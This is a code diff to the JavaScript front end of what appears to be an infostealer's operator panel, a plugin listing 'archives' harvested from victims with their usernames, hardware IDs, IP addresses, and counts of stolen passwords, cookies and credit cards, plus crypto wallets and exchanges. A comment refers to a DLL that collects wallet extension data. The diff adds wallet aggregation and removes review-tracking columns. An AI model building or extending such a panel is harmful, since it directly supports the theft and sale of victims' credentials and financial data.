@@ -52,6 +52,19 @@
     return Array.isArray(value) ? value.filter(Boolean).join(", ") : "";
   }
 
+  // Wallets column = desktop wallets + wallet browser extensions (the DLL now
+  // only collects extension data for known crypto wallets).
+  function walletList(info) {
+    const seen = new Set();
+    const out = [];
+    for (const w of [...(info.DesktopWallets || []), ...(info.BrowserExtensions || [])]) {
+      if (!w || seen.has(w)) continue;
+      seen.add(w);
+      out.push(w);
+    }
+    return out.join(", ");
+  }
+
   async function rpc(method, params) {
     const res = await fetch(`/api/plugins/${PLUGIN_ID}/rpc`, {
       method: "POST",
@@ -86,7 +99,7 @@
   function searchableText(row) {
     const info = row.info || {};
     return [
-      info.Username, info.HWID, info.IpAddress, info.Country, info.Note,
+      info.Username, info.HWID, info.IpAddress, info.Country,
       joinList(info.Browsers), joinList(info.Apps),
       joinList(info.DesktopWallets), joinList(info.BrowserExtensions),
       joinList(row.exchanges),
@@ -98,7 +111,7 @@
     if (sortKey) {
       const key = sortKey;
       const dir = sortDir === "asc" ? 1 : -1;
-      const numeric = new Set(["time", "domain", "passwords", "cookies", "cards", "seen"]);
+      const numeric = new Set(["time", "passwords", "cookies", "cards"]);
       const val = (row) => {
         const info = row.info || {};
         switch (key) {
@@ -106,18 +119,14 @@
           case "username": return (info.Username || "").toLowerCase();
           case "hwid": return (info.HWID || "").toLowerCase();
           case "group": return (info.Group || "").toLowerCase();
-          case "note": return (info.Note || "").toLowerCase();
           case "country": return (info.Country || "").toLowerCase();
           case "ip": return (info.IpAddress || "").toLowerCase();
           case "version": return (info.Version || "").toLowerCase();
-          case "seen": return row.seen ? 1 : 0;
-          case "domain": return Number(info.HistoryCount) || 0;
           case "browser": return joinList(info.Browsers).toLowerCase();
-          case "extensions": return joinList(info.BrowserExtensions).toLowerCase();
           case "passwords": return Number(info.PasswordsCount) || 0;
           case "cookies": return Number(info.CookiesCount) || 0;
           case "cards": return Number(info.CreditCardsCount) || 0;
-          case "wallets": return joinList(info.DesktopWallets).toLowerCase();
+          case "wallets": return walletList(info).toLowerCase();
           case "exchanges": return joinList(row.exchanges).toLowerCase();
           case "apps": return joinList(info.Apps).toLowerCase();
           default: return "";
@@ -132,26 +141,12 @@
     return rows;
   }
 
-  // Raw 32-char extension IDs (unmapped extensions) are grouped for display;
-  // the full list stays in the tooltip.
-  function displayExtensions(value) {
-    if (!Array.isArray(value)) return "";
-    const known = [];
-    let unknown = 0;
-    for (const e of value.filter(Boolean)) {
-      if (/^[a-z]{32}$/.test(e)) unknown++;
-      else known.push(e);
-    }
-    if (unknown > 0) known.push(`${unknown} unknown`);
-    return known.join(", ");
-  }
-
   function renderTable() {
     const rows = filteredArchives();
     checkAll.checked = rows.length > 0 && rows.every((r) => selected.has(r.id));
 
     if (rows.length === 0) {
-      tbody.innerHTML = `<tr><td colspan="21" class="xf-empty">${archives.length === 0 ? "No archives collected yet." : "No archives match the search."}</td></tr>`;
+      tbody.innerHTML = `<tr><td colspan="17" class="xf-empty">${archives.length === 0 ? "No archives collected yet." : "No archives match the search."}</td></tr>`;
       return;
     }
 
@@ -160,28 +155,23 @@
       const checked = selected.has(row.id) ? "checked" : "";
       const rowCls = ["xf-row"];
       if (selected.has(row.id)) rowCls.push("xf-selected");
-      if (row.seen) rowCls.push("xf-seen");
       const firstTime = info.FirstTime ? '<span class="xf-check-yes">✓</span>' : "";
-      const seenChecked = row.seen ? "checked" : "";
+      const wallets = walletList(info);
       return `<tr data-id="${row.id}" class="${rowCls.join(" ")}">
         <td class="xf-col-check"><input type="checkbox" class="xf-row-check" data-id="${row.id}" ${checked} /></td>
         <td>${escapeHtml(fmtTime(row.createdAt))}${row.partial ? ' <span class="xf-partial" title="Partial archive — the connection dropped mid-transfer">⚠</span>' : ""}</td>
         <td title="${escapeHtml(info.Username)}">${escapeHtml(info.Username)}</td>
         <td title="${escapeHtml(info.HWID)}">${escapeHtml(info.HWID)}</td>
         <td>${escapeHtml(info.Group)}</td>
-        <td title="${escapeHtml(info.Note)}">${escapeHtml(info.Note)}</td>
         <td>${escapeHtml(info.Country)}</td>
         <td>${escapeHtml(info.IpAddress)}</td>
         <td>${escapeHtml(info.Version)}</td>
         <td class="xf-col-center">${firstTime}</td>
-        <td class="xf-col-center"><input type="checkbox" class="xf-seen-check" data-id="${row.id}" ${seenChecked} title="Mark reviewed" /></td>
-        <td class="xf-col-num">${fmtNum(info.HistoryCount)}</td>
         <td class="xf-col-list" title="${escapeHtml(joinList(info.Browsers))}">${escapeHtml(joinList(info.Browsers))}</td>
-        <td class="xf-col-list" title="${escapeHtml(joinList(info.BrowserExtensions))}">${escapeHtml(displayExtensions(info.BrowserExtensions))}</td>
         <td class="xf-col-num">${fmtNum(info.PasswordsCount)}</td>
         <td class="xf-col-num">${fmtNum(info.CookiesCount)}</td>
         <td class="xf-col-num">${fmtNum(info.CreditCardsCount)}</td>
-        <td class="xf-col-list" title="${escapeHtml(joinList(info.DesktopWallets))}">${escapeHtml(joinList(info.DesktopWallets))}</td>
+        <td class="xf-col-list" title="${escapeHtml(wallets)}">${escapeHtml(wallets)}</td>
         <td class="xf-col-list" title="${escapeHtml(joinList(row.exchanges))}">${escapeHtml(joinList(row.exchanges))}</td>
         <td class="xf-col-list" title="${escapeHtml(joinList(info.Apps))}">${escapeHtml(joinList(info.Apps))}</td>
         <td class="xf-col-actions">
@@ -203,7 +193,7 @@
         localStorage.setItem("xfill-cache", JSON.stringify(archives.slice(0, 300)));
       } catch {}
     } catch (err) {
-      tbody.innerHTML = `<tr><td colspan="20" class="xf-empty">Failed to load archives: ${escapeHtml(err.message)}</td></tr>`;
+      tbody.innerHTML = `<tr><td colspan="17" class="xf-empty">Failed to load archives: ${escapeHtml(err.message)}</td></tr>`;
     }
   }
 
@@ -291,17 +281,6 @@
     }
   });
 
-  document.getElementById("xf-delete-seen").addEventListener("click", () => {
-    const ids = archives.filter((r) => r.seen).map((r) => r.id);
-    if (ids.length === 0) {
-      alert("No seen archives to delete.");
-      return;
-    }
-    if (confirm(`Delete ${ids.length} reviewed (seen) archive(s)? This removes the zip files permanently.`)) {
-      removeIds(ids);
-    }
-  });
-
   document.getElementById("xf-delete-all").addEventListener("click", async () => {
     if (archives.length === 0) return;
     if (!confirm(`Delete ALL ${archives.length} archive(s)? This removes every zip file permanently.`)) return;
@@ -322,16 +301,6 @@
   });
 
   tbody.addEventListener("change", (e) => {
-    const seenBox = e.target.closest(".xf-seen-check");
-    if (seenBox) {
-      const id = Number(seenBox.dataset.id);
-      const seen = seenBox.checked;
-      const row = archives.find((r) => r.id === id);
-      if (row) row.seen = seen;
-      seenBox.closest("tr")?.classList.toggle("xf-seen", seen);
-      rpc("setSeen", { ids: [id], seen }).catch((err) => showStatus(`seen update failed: ${err.message}`, true));
-      return;
-    }
     const box = e.target.closest(".xf-row-check");
     if (!box) return;
     const id = Number(box.dataset.id);
@@ -343,7 +312,7 @@
   });
 
   tbody.addEventListener("click", (e) => {
-    if (e.target.closest(".xf-row-check") || e.target.closest(".xf-seen-check") || e.target.closest("a")) return;
+    if (e.target.closest(".xf-row-check") || e.target.closest("a")) return;
     const delBtn = e.target.closest(".xf-row-delete");
     if (delBtn) {
       const id = Number(delBtn.dataset.id);
@@ -505,12 +474,6 @@
 
   async function openViewer(id) {
     const row = archives.find((r) => r.id === id);
-    // Opening an archive marks it reviewed so duplicates can be cleaned up.
-    if (row && !row.seen) {
-      row.seen = true;
-      renderTable();
-      rpc("setSeen", { ids: [id], seen: true }).catch(() => {});
-    }
     const info = row?.info || {};
     viewerTitle.textContent = row
       ? `${info.Username || row.clientId} — ${row.filename} (${fmtSize(row.size)})`
